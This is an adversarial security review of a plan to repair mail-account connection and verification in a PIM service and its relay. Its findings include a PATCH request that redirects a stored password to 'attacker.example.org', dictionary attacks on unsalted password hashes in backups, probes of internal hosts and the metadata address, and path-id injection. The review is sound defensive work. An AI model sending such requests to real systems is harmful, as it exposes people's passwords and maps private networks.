# Plan validation: adversarial review

- **Plan:** `docs/superpowers/plans/2026-11-20-pim-account-connect-repair.md`
- **Spec:** `docs/superpowers/specs/2026-11-20-pim-account-connect-repair-design.md` (approved 2026-11-20)
- **Code read:** Aura `master` (working tree of 2026-11-20); PIM fork `D:/tmp/aura-pim-mcp` at `bb87b82`; MailKit 4.18.2 XML docs from the local NuGet cache; two public ISPDB answers (`autoconfig.thunderbird.net/v1.1/gmx.com` and `/outlook.com`, fetched 2026-11-20).
- **Date:** 2026-11-20. This was a read-only review. Nothing was run against the stack.

## Verdict: YELLOW

The architecture holds, and no finding forces a redesign:
- discovery and verification live in the PIM;
- Aura only relays them;
- the merge PATCH reads through the tenant-scoped config;
- `Repaired` is placed in `pimwatch`.

Five High findings would still ship a credential leak, a repair that silently does not take, or a red build. The plan must be amended for them before P1 starts:
- **H1 and H4** need an operator decision, because they contradict a sentence of the spec ("blank fields mean unchanged") or change behaviour for existing accounts.
- **H2, H3 and H5** are fixed inside the plan's own tasks.

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 5 |
| Medium | 12 |
| Low | 11 |

No finding is Critical. The worst chains (H1, H3) need either a hijacked cockpit session or read access to Postgres or its backups, not just an identity.

---

## High

### H1. A PATCH that names a new host sends the stored password there, even when the write is then refused

**Scenario.** An IMAP account is stored with `ENC:` password, host `imap.example.com`. Someone acting as that identity (a hijacked session, an unlocked screen, any XSS in the cockpit) sends
`PATCH /api/connect/pim/accounts/<id>/provider-config` with `{"providerConfig":{"imapHost":"attacker.example.org","imapPort":"143"}}`.
1. P3 merges: the stored password stays.
2. The verifier unprotects it (`ImapAccountConfig.From`) and authenticates to `attacker.example.org:143`.
3. Port 143 means `StartTlsWhenAvailable`, so a server that does not offer STARTTLS receives `LOGIN user password` in clear.
4. The verification "fails" (or passes), and the PATCH answers 422 or 200. Either way the password has left the box.

The same works with `smtpHost`, because `OpenSmtpAsync` authenticates to anything that advertises AUTH.

Today the password is write-only: `GET /admin/accounts` never returns `providerConfig`. This PATCH turns a session into the mailbox's long-lived password, which people reuse.

**Evidence.**
- Spec Part 4 Repair: "the closed «Impostazioni server» disclosure whose blank fields mean "unchanged"".
- Plan P3: "It merges the non-empty values over the stored ones … verifies (`imap`)"; Step 3: "a kept `ENC:` one is unprotected by `ImapAccountConfig.From`".
- PIM `ImapProviderService.cs:154`: `await client.ConnectAsync(cfg.ImapHost, cfg.ImapPort, SecureSocketOptions.Auto, ct);` and `:170-172` SMTP authenticates `if (client.Capabilities.HasFlag(SmtpCapabilities.Authentication))`.
- MailKit 4.18.2 docs, `ImapClient.ConnectAsync`: "If the port has a value of 993, then the default options used will be SslOnConnect. All other values will use StartTlsWhenAvailable". `StartTlsWhenAvailable`: "but only if the server supports the STARTTLS extension".

**Change to the plan. Operator decision needed.** Options:
- **(a) Recommended.** A PATCH that changes `imapHost`, `imapPort`, `smtpHost`, `smtpPort` or `username` must carry `password`, or it is `400 {"error":"password_required"}`. «Cambia password» keeps "blank = unchanged" for the password-only case. The spec sentence is amended: "a change of server or username asks for the password again".
- **(b)** Keep blank = unchanged, but only for hosts whose registrable domain equals the stored one's.
- **(c)** Accept the risk and record it in the spec's "what this does not prove".

Pin the decision with `Patch_NewHostWithoutPassword_Is400_AndNothingConnects`, where the fake verifier records no call.

### H2. After a repair, the pooled IMAP connection can keep the old password or the old host indefinitely

**Scenario.** A watch tick is running on the account while the PATCH lands. The plan orders P3 as "stores … calls `ForgetConnectionAsync`, then `AccountConfigurationReload.Apply`".
1. Between Forget and Reload, a second call resolves the config from the registry, which has not reloaded yet. It opens a fresh connection with the old config and caches it.
2. `AcquireClientAsync` never compares the cached client with the current config. A NOOP that still answers keeps the stale client forever:
   - with a new host, the watch keeps reading the old server;
   - with a new password, the old session survives until the server drops it.
3. The plan also does not say that `ForgetConnectionAsync` takes `conn.Gate`. Disposing a client that an in-flight `WithImapAsync` is using throws `ObjectDisposedException`. That exception is not in `IsConnectionException`, so ProviderFailures turns the tick into an unclassified failure.

**Evidence.**
- PIM `ImapProviderService.cs:241-262`: `var existing = conn.Client; if (existing is { IsConnected: true, IsAuthenticated: true }) { … await existing.NoOpAsync(ct); return (existing, true); } … var fresh = await OpenImapAsync(cfg, ct); conn.Client = fresh;`. The config is used only to open a new connection, never to check the cached one.
- `:113-116` `ResolveConfigAsync` reads `_accountRegistry`, which `AccountConfigurationReload.Apply` (`Admin/AccountConfigurationReload.cs:13-18`) refreshes.
- Plan P3 Interfaces: "`ForgetConnectionAsync(string accountId)` evicts and disposes the pooled connection, if one exists".

**Change to the plan.**
- `PooledImapConnection` remembers the `(host, port, username, password)` its client was opened with. `AcquireClientAsync` evicts under the gate when the config it was handed differs. That closes the race whatever the call order.
- `ForgetConnectionAsync` then becomes either unnecessary, or a gate-taking evict that runs **after** `Reload`.
- Key the pool lookup by `existing.Id` from the config, not by the path id: `FindAccountIndex` is case-insensitive, while `ConcurrentDictionary` uses the default ordinal comparer.
- Test with the real `ImapProviderService` against Dovecot. Open the pooled connection, change the password in the config, then call `ReadAsync`. The next read must authenticate with the new config (or fail on the old one), not reuse the old session.

### H3. A2 skips the idempotency inventory: the build goes red, and the default normalizer hashes the password into Postgres

**Scenario.**
1. A2 registers `POST …/discover`, `POST …/accounts/{id}/verify` and `PATCH …/accounts/{id}/provider-config` and lists no change to `internal/agui/idempotency_http.go`. `TestEveryRegisteredUnsafeHTTPRouteIsClassified` (`internal/agui/mutation_coverage_test.go:47`) greps every `mux.HandleFunc("PATCH …")` and fails on any route that is neither inventoried nor in `readOnlyPOST`.
2. The implementer adds the routes with `httpMutationMeta(...)`, as the five existing PIM routes do. `normalizeHTTPMutation` then puts the raw body into the fingerprinted intent, and `FingerprintTyped` is an unsalted `sha256.Sum256(json.Marshal(intent))`. That hash is stored in `aura.idempotency_operations.payload_hash` and is in every `pg_dump`. Expiry does not remove it: `ClearExpiredReplayBody` (`internal/db/queries/idempotency_operations.sql:133-150`) nulls the replay columns only, and no query in the tree deletes from `aura.idempotency_operations`. The row goes only when its identity is deleted (FK `ON DELETE CASCADE`).
3. The PATCH body is `{"providerConfig":{"password":"X"}}`. Normalizer name, method, path (the account id, also in the `pimwatch` tables) and content type are all predictable, so `X` is the only unknown. Anyone who reads a backup can run a dictionary attack at GPU SHA-256 speed.

That defeats Part 2b for anyone holding a Postgres backup. Create has had the same exposure since the routes were inventoried; there it is diluted only by the other guessable fields.

**Evidence.**
- `internal/agui/idempotency_http.go:125`: `"POST /api/connect/pim/accounts": httpMutationMeta("pim_account_create")`.
- `:206-222`: `Body: append(json.RawMessage(nil), trimmed...)`.
- `internal/idempotency/fingerprint.go:18-22`: `encoded, err := json.Marshal(payload) … return sha256.Sum256(encoded), nil`.
- `internal/db/migrations/0043_idempotency_operations.up.sql`: `payload_hash bytea NOT NULL`.
- `internal/agui/mutation_coverage_test.go:94-95`: `if _, ok := httpMutationRoutes[route]; !ok { t.Errorf("unsafe registered route %q lacks idempotency metadata", route) }`.
- `web/src/api/idempotency.ts:24-26` mints a fresh UUID per fetch, so the key itself is fine; a second «Prova di nuovo» is never a stale replay.

**Change to the plan.** A2's file list gains `idempotency_http.go` and the coverage test, and:
- `discover` goes into `readOnlyPOST`. It writes nothing; the precedent is `POST /api/settings/remote-access/token/verify`.
- `verify` is inventoried. It is not write-free: `Repaired` resumes a task and moves `next_run_at`.
- `provider-config` PATCH and `POST /api/connect/pim/accounts` get a normalizer that replaces every `providerConfig` key `IsSecretKey` (`password`, case-insensitive) with an HMAC under a server secret before fingerprinting. Fix create on touch, per the "NOT MY WORK" rule.
- Add a test: two PATCH bodies differing only in password give different fingerprints, and neither fingerprint equals the plain SHA-256 of the body.

### H4. Discovery fills in hosts without their TLS mode, so a found server can be used in plaintext or not at all

**Scenario.** ISPDB states every server's `socketType` (`SSL`, `STARTTLS`, `plain`) and `authentication` (`password-cleartext`, `OAuth2`, …). P4 keeps hostname and port only ("only well-formed `imap`/`smtp` servers with a port 1-65535 and a hostname are accepted"). The openers then derive security from the port alone:
- An ISPDB entry `imap.example.org:143, socketType=plain` is accepted. The password is verified and then used in clear on every tick.
- An entry that is `SSL` on a port other than 993/465 is spoken to as STARTTLS-when-available. It fails as `tls_failed`/`unreachable`, so discovery found the right server and the check refuses it.
- An entry whose only `authentication` is `OAuth2` is offered a password field that can never work.
- On a non-993 port, a network attacker who strips the STARTTLS capability downgrades even a server that offers TLS.

**Evidence.**
- ISPDB answers carry both fields. `v1.1/gmx.com` has `<port>143</port><socketType>STARTTLS</socketType>…<authentication>password-cleartext</authentication>`, and `v1.1/outlook.com`'s only IMAP server has `<authentication>OAuth2</authentication>`.
- Plan P4 Review Focus 4 and Step 4, which read `incomingServer`/`outgoingServer` with no mention of `socketType` or `authentication`.
- MailKit docs quoted in H1.
- `ImapProviderService.cs:154,170`: `SecureSocketOptions.Auto` for both.

**Change to the plan.**
- In P4 (no decision needed): drop `socketType=plain` servers and `OAuth2`-only servers. Return `imapSecurity`/`smtpSecurity` (`ssl`|`starttls`) in `DiscoveryResult` and in the preset entries, and store them as provider-config keys. Have `ImapConnections` map them to `SslOnConnect`/`StartTls` (required), keeping `Auto` only when the key is absent. Add `Ispdb_DropsPlainAndOAuthOnlyServers`.
- **Operator decision:** should an account without the key (all accounts today, and typed hosts) also require TLS (`StartTls` instead of `StartTlsWhenAvailable`)? That would break an on-premises server without TLS.

### H5. «Prova di nuovo» checks a different path from the one that fails, so the motivating case can loop and stay unmeasured

**Scenario.** The field report is a `provider_transient` failure on an IMAP account, and the spec says its cause is unmeasured. The verifier only does connect, authenticate, EXAMINE `client.Inbox`, then SMTP connect and authenticate. So it reproduces a socket, TLS or login-stage failure, but **not** a failure after EXAMINE. The watch's `ReadAsync` goes on to the UIDVALIDITY check, `VanishedAsync`, `NewMailAsync`, CONDSTORE and the Sent folder for written-to, and an `ImapCommandException`/`ImapProtocolException` there is transient. If the field failure is of that second kind:
1. Verify answers 200, and the row says «L'accesso funziona».
2. `Repaired` runs a tick, the tick fails again, and `failing_since` stays where it was.
3. The row goes back to «Non riesco a leggere la posta da … Prova di nuovo o cambia la password»: a loop with no exit.

Which kind the field failure is, nobody knows yet. That is exactly why the check must not assume the first kind.

Meanwhile the evidence the spec wants, "the server line", is logged by neither path:
- The watch path deliberately logs the type only: `ChangesService.cs:129-131`, "Logs the exception's type and not its message".
- The verifier logs `ex.Message`. For a failed LOGIN, MailKit's message may be its own boilerplate: `Authentication failed.` is a resource string in MailKit 4.18.2's `net8.0` DLL. Whether the server's text reaches `Message` is not established.

**Evidence.**
- Spec "Why" 4 and Verification 6: "«Prova di nuovo» logs the exception type and server line".
- Plan P1 Step 3: "IMAP: open, `client.Inbox.OpenAsync(FolderAccess.ReadOnly)`, disconnect … Log … `ex.Message` trimmed to 200 characters".
- PIM `ImapProviderService.Changes.cs:84-104` (what the watch actually does) and `ChangesService.cs:127-131`.

**Change to the plan.**
- (a) The verifier opens `cfg.InboxFolder` (not `client.Inbox`) and runs the watch's first read step: `UidNext`/`UidValidity` plus one `UID SEARCH` over the newest window. The reused body of `StartAsync` would do.
- (b) For IMAP, `GuardAsync` also logs `ImapCommandException.ResponseText` / `ImapProtocolException` type and the command name, CR/LF-stripped and trimmed. The server's line is evidence; the request is never in it. Without this, the next field case is still unmeasured. This amends a written fork rule (`AURA-FORK.md` change 8: "A cursor is never logged, and neither is a provider's exception message"), so it is a fork-policy change and needs its own `AURA-FORK.md` line.
- (c) The verifier logs `ResponseText` / `SmtpCommandException.StatusCode` explicitly instead of `Message`. Add an integration test against Dovecot with a wrong password asserting that the captured log holds Dovecot's `NO` text.
- (d) W4: when verify passes and the row is still failing after the woken tick, say «L'accesso funziona, ma la lettura della posta fallisce ancora» rather than offering the same two buttons again.

---

## Medium

### M1. The PATCH accepts every provider, and the relay does not strip the admin-owned OAuth keys

**Scenario.** A member sends `PATCH …/accounts/<google id>/provider-config {"providerConfig":{"clientId":"…","clientSecret":"…"}}` or `{"tenantId":"common"}` on an Outlook.com account. P3 merges for any provider ("validates … verifies (`imap`)"), and Aura's relay forwards the body as-is. This bypasses `identity.create`, the gate that makes provider apps admin-only (`serve_webui.go:265`). On Outlook.com, `tenantId=common` breaks sign-in (`pimprovider/rules.go:41-44`).

**Evidence.**
- `internal/agui/connect_pim_inject.go:49-50`: `maps.DeleteFunc(config, func(key, _ string) bool { return pimprovider.IsOwnedKey(key) }); maps.Copy(config, app.ProviderConfig())`, which only create runs.
- `internal/pimprovider/rules.go:39`: `var ownedKeys = []string{"clientId", "clientSecret", "tenantId"}`.

**Change.**
- PIM: the PATCH answers `400 {"error":"not_patchable"}` for any provider but `imap`, matching the spec, which describes it for IMAP only.
- Aura: the relay also drops `IsOwnedKey` keys.
- Add a test on each side.

### M2. The startup encryption pass must not round-trip the file through `AccountInfo`, and its write is not atomic

**Scenario.**
1. If `ProtectStoredPasswordsAsync` is implemented like the other writers (`ParseAccounts` then `AccountInfoToNode`), it rewrites every tenant's node: PascalCase, a materialised `Permissions` block, unknown properties dropped. That is not "every other key unchanged".
2. `WriteConfigAsync` is `File.WriteAllTextAsync`, which truncates and then writes. A stop during that write leaves an empty or partial `appsettings.json`.
3. The compose entrypoint then re-seeds an empty one (`test -s /app/data/appsettings.json || printf '{"CalendarMcp":{"Accounts":[]}}'`), so every tenant's accounts are gone.

The new pass writes unattended on the first boot after an update, which is exactly when the updater restarts containers. Separately, key matching: the stored dictionary is case-insensitive and hand- or CLI-written files can hold `"Password"`.

**Evidence.**
- PIM `AccountConfigurationService.cs:211-216` (`WriteConfigAsync`), `:255-270` (`AccountInfoToNode`), `:386-399` (`OrdinalIgnoreCase` provider config).
- Aura `compose.yaml` aura-pim-mcp `entrypoint`.

**Change.**
- The pass edits the `JsonNode` tree in place: only `ProviderConfig.<password in any casing>` of each node.
- It writes through a temp file plus `File.Move(overwrite: true)` in the same directory. Fix `WriteConfigAsync` itself on touch.
- `ProtectStored_RewritesOnlyPlainPasswords` also asserts that every other node is unchanged, and covers a `"Password"` key and a DAV account (decision 3 includes them).

### M3. The cursor is not bound to the server or the username, so a PATCH can silently move the watch to another mailbox

**Scenario.** A PATCH changes `username` (another mailbox on the same server) or `imapHost`. The watch keeps its cursor, which is the spec's "keeps its cursor". The cursor's only identity check is the folder's UIDVALIDITY:
- if the new INBOX has the same UIDVALIDITY, mails with a UID at or below the saved last UID are never read, and the old `known` UIDs come back as `Deleted` changes;
- the watch's verdicts and learning, keyed by account id, are carried over to a different person's mail.

**Evidence.**
- PIM `ImapProviderService.Changes.cs:198-199`: `ChangesCursor.Of(ChangesKind, cfg.InboxFolder, position)`, which binds kind and folder name only.
- `:85`: `if (folder.UidValidity != saved.UidValidity) throw new CursorExpiredException();`.
- `ChangesCursor.cs:83`: only `wire.K` (kind) is checked.

**Change. Operator decision needed:**
- **(a)** The PATCH refuses a `username` change (`400 username_immutable`): another mailbox is another account.
- **(b)** On a host or username change, Aura's `Repaired` restarts the account's cursors (`startCursors`) instead of keeping them, and the spec says "a changed server or username starts the watch from now".

### M4. `Repaired` can resume a task it cannot fix, and its "run now" can be lost

**Scenario.**
1. `RecordTaskRunOutcome` counts every failed run. A watch paused for `failures` may have paused for a hard code that is not about the login: `permission_denied`, `account_not_found`, `invalid_cursor`, `invalid_items`, `too_many_items` (`internal/pimwatch/client.go:273-275`). Verify answers 200 because the login works, `Repaired` resumes, and three more failed runs pause it again with a second «Ho messo in pausa…» notice. Each press of «Prova di nuovo» repeats the cycle.
2. If a run of that task is in flight, `RunTaskNow` sets `next_run_at = now()`. The next tick's claim then fails with `ErrAlreadyRunning`, and `reschedule` pushes `next_run_at` to the next interval. The in-flight run used the old config. The spec's "the row then clears on that tick" does not happen until the next interval.

**Evidence.**
- `internal/db/queries/scheduler_tasks.sql:221-240` (`RecordTaskRunOutcome`), `:161-166` (`RunTaskNowRow`).
- `internal/cron/scheduler.go:356-378`: `if errors.Is(err, ErrAlreadyRunning) { … s.reschedule(ctx, task) …}` and the reschedule on claim.

**Change.**
- `Repaired` resumes a `failures` pause only when the account's cursor `last_error` is credential-class (`provider_auth`, `provider_transient`, `pim_*`). Otherwise it leaves the pause and the cockpit's existing resume switch in place.
- Add `TestRepairedLeavesAFailurePauseForAnotherCauseAlone`.
- Either record in the spec that a repair landing during a run takes effect at the next interval, or make the skip path keep an earlier `next_run_at`. Today `reschedule` calls `UpdateNextRunAt` (`scheduler_tasks.sql:74-77`, a plain `SET next_run_at = $2`); `ScheduleTransientRetry` shows the `LEAST(...)` pattern that would keep it.

### M5. The 409 suffix loop turns a re-add of the same mailbox into duplicate accounts

**Scenario.** «Collega» for `mario.rossi@example.com` gives id `mario-rossi-example-com`. Any 409 retries `-2`…`-9`. A 409 is far more often the same mailbox than a different address with the same slug:
- An abandoned Google consent leaves its row. W2 creates the OAuth account before consent, and "an account exists from the moment it is added".
- Aura's 25 s client gives up while the PIM still writes. `CreateAccount` takes no `CancellationToken`, so the write completes. The person presses «Collega» again.
- The person adds the same address twice.

Each case yields `-2` with a second copy of the password. If both watches are on, there are two digests' worth of decisions.

**Evidence.**
- Plan Global Constraints: "on `409` retry with `-2` … `-9`".
- PIM `AdminEndpoints.cs:149-153`: `CreateAccount` has no `CancellationToken` parameter.

**Change.** On a 409, W2 reads the account list:
- if an account with `displayName` equal to the address exists, it says «Questo indirizzo è già collegato» and offers «Cambia password» on it (an OAuth leftover is offered «Rimuovi»);
- only a different `displayName` takes the suffix.

Add `ConflictOnTheSameAddressOffersRepair`.

### M6. What the person sees when anything but a 422 happens is unspecified

**Scenario.** W2 and W4 specify the 422 path only. They say nothing about:
- discovery when the PIM is down (502). This should fall through to «Impostazioni server», not block the form;
- create timing out at 25 s (502 while the account may exist; see M5);
- `400` for a slug the PIM refuses, from an address whose local part and domain contain nothing in `[a-z0-9]`;
- `401 calendar authorization required` when the identity has no calendar grant yet. Grants come from the first-party keeper, which runs every 5 minutes (`cmd/aura/mcp_first_party_grants.go`, `firstPartyGrantInterval = 5 * time.Minute`). Whether provisioning also mints one at once was not read; if it does not, a new identity sees 401 for up to 5 minutes;
- nine conflicts in a row.

`pimVerifyFailure` returns null for all of these, and nothing says what renders then.

**Change.**
- Name a message key for each (`settings.mail.error.pimDown`, `…timeout`, `…invalidAddress`, `…notReady`).
- Make discovery failure equal `unknown`.
- Add `PimDownDuringDiscoveryOpensTheServerFields` and `CreateTimeoutChecksTheListBeforeRetrying`.

### M7. Verifying SMTP blocks read-only use where outbound SMTP is closed

**Scenario.** An office firewall or ISP blocks 465/587 from the VM. Today an IMAP account can be added and watched, because the watch only reads. With P1 and P3, create answers `422 smtp_unreachable`, and the account can never be saved. The watch never sends.

**Change. Operator decision:**
- (a) SMTP failure is a warning: the account is stored, and the row shows «Invio non verificato».
- (b) Keep it blocking, and say so in the spec's non-goals.

### M8. The verify and create routes are an unthrottled port and credential oracle, with no rate limit

**Scenario.** Any identity can name `postgres:5432`, `arcadedb:2480`, `169.254.169.254:80` or a colleague's username at the provider. The distinct outcomes are:
- `unreachable` (connection refused) after milliseconds;
- `unreachable` after 20 s (an open port that never sends an IMAP greeting);
- `tls_failed` / `auth_failed`.

Together these map the compose network and test passwords at line rate. Repeated failures can also get the office's public IP rate-limited at the provider for every account on the box. The `reason` is intentionally coarse (spec Part 2), but the timing is not.

`AURA-FORK.md` already states that "nothing here restricts the target network". That was true before, but the oracle was asynchronous: one attempt per watch tick.

**Discovery itself does not add an internal-host path.**
- It contacts only the fixed ISPDB host over HTTPS and the resolver.
- The MX answer is used for its domain labels, never dialled. An MX of `postgres` becomes an ISPDB lookup of `postgres`, which finds nothing.
- An internal host can reach the form only as hosts in an ISPDB answer, which is Mozilla's curated database. P4 also does not take Thunderbird's other autoconfig sources (`autoconfig.<domain>`, `/.well-known/autoconfig`), which a domain owner controls; keep it that way.
- The internal-host risk is therefore the person's own typed hosts (this finding) and H1's PATCH.

**Change. Operator decision on network restriction**, since an office may run its own IMAP on `192.168.x.x`. In any case, add a per-identity limit on `verify` + create in the relay (for example 10 per minute, 429), and a test.

### M9. The app-password fallback for Google and Outlook.com is written into W2 before P4 has checked it exists

**Scenario.** W2 step 2 always offers «Usa una password per app» when the provider app is not configured, using "the hosts of the provider's preset entry (P4 includes IMAP hosts for gmail.com and outlook.com for this reason)". P4 Step 1, however, tells the builder to copy each rule from the provider's page and to drop what the page does not support. Whether a personal Microsoft account still accepts an app password for IMAP is not established in the spec. ISPDB's own `v1.1/outlook.com` entry lists its IMAP server with `<authentication>OAuth2</authentication>` only. That is a hint, to be confirmed on Microsoft's page in P4, and P4 may well conclude there is no fallback. W2 has no branch for that conclusion.

**Change.**
- Preset entries carry `passwordFallback: true|false`.
- W2 offers the fallback only when it is true. Otherwise it shows «Chiedi all'amministratore di configurare l'app Microsoft» (`settings.mail.providerAppMissingNoFallback`).
- Add a test for the false branch.

### M10. Discovery does not specify how the domain is normalised, validated or cached

**Scenario.**
- The domain goes straight into `https://autoconfig.thunderbird.net/v1.1/<domain>` and into a DNS query. `a@x/../../v1.1/y` or `a@x?q` reach other paths. P4 lists `Discover_BadAddress_Is400` but not what "bad" means.
- Uppercase and IDN domains (`Città.example`) need lowercase plus `IdnMapping` before both the cache key and the request.
- The ISPDB format also defines `%EMAILDOMAIN%` (for hosting entries such as `mail.%EMAILDOMAIN%`); no file using it was fetched here, so confirm it in P4. It matters most on the `ispdb-mx` path, and the plan substitutes only `%EMAILADDRESS%`/`%EMAILLOCALPART%`.
- "Registrable domain, taken as the last two labels" gives `co.uk` for `mx1.example.co.uk`, so ISPDB is asked for a public suffix.
- `IMemoryCache` with no `SizeLimit`, keyed by caller-supplied domains, grows without bound. Negative answers are uncached, so each one costs ISPDB plus DNS.
- A plus-tagged local part (`mario+news@example.com`) becomes the IMAP username. A sub-address is a delivery alias, so the login likely fails; that was not measured here.

**Change.**
- The PIM parses the address with `MailboxAddress.TryParse`, lowercases, IDN-maps, and validates the domain as a hostname (`Uri.CheckHostName == Dns`, at least one dot).
- Substitute `%EMAILDOMAIN%`.
- Take the registrable domain from the Public Suffix List (a vetted package; READ THE DOCUMENTATION FIRST), or try the MX's suffixes from longest to shortest.
- Use a bounded cache (size limit, plus negative entries for about 1 h).
- Strip `+tag` from the username for the `address` form.
- Add a test for each.

### M11. Several named tests cannot prove what Review Focus says they prove

- **`Patch_KeepsTheStoredPasswordWhenNoneIsSent` contradicts itself.** P3 Step 3 hands the verifier the merged dictionary with the `ENC:` value still in it, so the fake verifier receives `ENC:…`, not "the unprotected stored password". Review Focus 1 (ciphertext sent as the password) is proved only with the real verifier. Add `Verify_StoredEncryptedPassword_LogsIn` against Dovecot.
- **No foreign-account test for verify.** Review Focus 2 has `Patch_OnAForeignAccount_IsNotFound`, but nothing covers `POST /admin/accounts/{foreign}/verify`. Add `Verify_OnAForeignAccount_IsNotFound`.
- **`Patch_EvictsThePooledConnection` with a fake service** proves a call happened, not that the next read uses the new config (H2).
- **No test asserts the log line** that spec Verification 6 relies on (H5 c).
- **Review Focus 3 is not pinned by the test named for it.** `ProtectStored_LeavesEncryptedValuesAlone` runs the pass twice on the same key ring, so it proves idempotence, not a missing ring. Add `StartupPass_WithANewKeyRing_LeavesForeignCiphertextAlone`: a file holding an `ENC:` value from another `EphemeralDataProtectionProvider`; the pass returns 0 and the bytes are unchanged.
- **Review Focus 4 is half pinned.** `Ispdb_IgnoresAServerWithoutAValidPort` covers the port, not "and a hostname". Add `Ispdb_IgnoresAServerWithAnInvalidHostname` (empty, `%…%` left unsubstituted, a bare label, an IP literal if the operator so decides).
- **Slow tests.** `TestCreateWaitsForASlowVerification` sleeps 10 s and `Discover_FallsThroughOnTimeout` waits up to 12 s. Inject the timeouts (a client parameter in Go; `TimeProvider`/configurable budget in .NET) so the race-enabled suites do not slow down.

### M12. The PATCH merges over a snapshot it read 20 seconds earlier

**Scenario.** P3 reads `existing`, verifies for up to 20 s, then writes a whole node built from `existing` through `UpdateAccountAsync`. Any write in between is reverted: a second PATCH, upstream `PUT`, or a CLI change. With two PATCHes A (password) and B (server fields, slower verify), B writes A's old password back.

**Evidence.**
- PIM `AccountConfigurationService.cs:81-95`: `UpdateAccountAsync` replaces the node at the index.

**Change.** Write through a new `MergeProviderConfigAsync(id, expected, merged)` that, under `_fileLock`, re-reads the node. It answers `409 {"error":"changed"}` when the stored provider config differs from what was verified.

---

## Low

1. **A request value that starts with `ENC:` is stored as-is.** `ProviderSecrets.Protect` skips "already `ENC:`" values, and P2 applies it to request bodies. A real password beginning with `ENC:` becomes undecryptable, and a leaked blob from one tenant would be accepted on another tenant's account: one key ring, constant purpose (`PasswordProtector.cs:22`). Always protect values that come from a request; only stored values bypass.
2. **Verify opens `client.Inbox`; the watch opens `cfg.InboxFolder`** (`ImapProviderService.Changes.cs:84`). With a custom `inboxFolder`, verify passes and the watch fails `FolderNotFoundException`, which is `provider_auth`. Use `cfg.InboxFolder` (also H5 a).
3. **Path ids are concatenated unescaped.** `"/admin/accounts/"+id+…` (`connect_pim_api.go:144,258`) uses the decoded `PathValue`, so `%2F..%2F` and `%3F` re-target the PIM path. The impact is bounded: same bearer, same tenant, and only verify/discover/PATCH shapes. The new handlers use `url.PathEscape(id)`; fix the old ones on touch.
4. **Logging.** The verifier logging `ex.Message` departs from `ChangesService.cs:118-119` ("a provider's message can quote the request"). Strip CR/LF, because a hostile server writes the log line. Can a message echo the credentials? MailKit does not log the client side here (`ImapNoCodes.LogClient` is empty), and the message is the server's text or MailKit's own wording. So a password reaches the log only if the server writes it back. For an honest server that does not happen; a hostile one already received the password. `ImapAccountConfig` is a positional record, so its generated `ToString()` prints `Password`. Override `PrintMembers` so that no future log call leaks it.
5. **The key ring is plaintext XML in `/app/data/keys`, beside the ciphertext, on the same volume** (`DataProtectionExtensions.cs:24-27`, no `ProtectKeysWith…`). Encryption protects a leaked `appsettings.json` alone, not a leaked volume. Also, `scripts/restore_drill.sh` drills Postgres, the conversation sidecars, Garage and ArcadeDB, and not `aura-pim-data`. Both belong in L1's "what this does not prove".
6. **The spec's "builder confirms the key ring sits on a kept volume" has no step in the plan.** Checked here: `CALENDAR_MCP_CONFIG=/app/data` (Dockerfile), `GetDataProtectionKeysDirectory() = <data>/keys` (`ConfigurationPaths.cs:97-100`), and `compose.yaml` mounts `aura-pim-data:/app/data`. It holds. Record that in P2's commit.
7. **Scope divergence.** Decisions 3 and 6 make upstream `PUT` store encrypted. The spec says "Upstream `PUT` is left as it is". The change is harmless and arguably right, but it is a spec amendment, not a plan decision.
8. **`AURA-FORK.md`'s resolution rule names `ImapProviderService.cs: OpenImapAsync makes its client with ImapNoCodes.NewClient()`.** After P1 the opener lives in `ImapConnections.cs`; update the rule in the P1 commit, or the next upstream sync re-introduces `new ImapClient()`.
9. **Password whitespace.** Nothing says the cockpit must not trim a password, or that "non-empty" means `!= ""` rather than `IsNullOrWhiteSpace`. Spell out both, and test a password with a trailing space.
10. **Some failures get the wrong name.** `SmtpCommandException` (for example `554` at greeting) and whatever MailKit throws for a server that disables LOGIN before TLS fall into "any other exception", which maps to `smtp_unreachable`/`unreachable`. The person is told "unreachable" for a server that answered and refused. The spec's Goal 2 lists "sending refused".
11. **IMAP and SMTP share one 20 s budget.** A slow IMAP step leaves SMTP a few hundred ms, and it is reported `smtp_unreachable`. Give each step its own share (for example 12 s + 8 s).
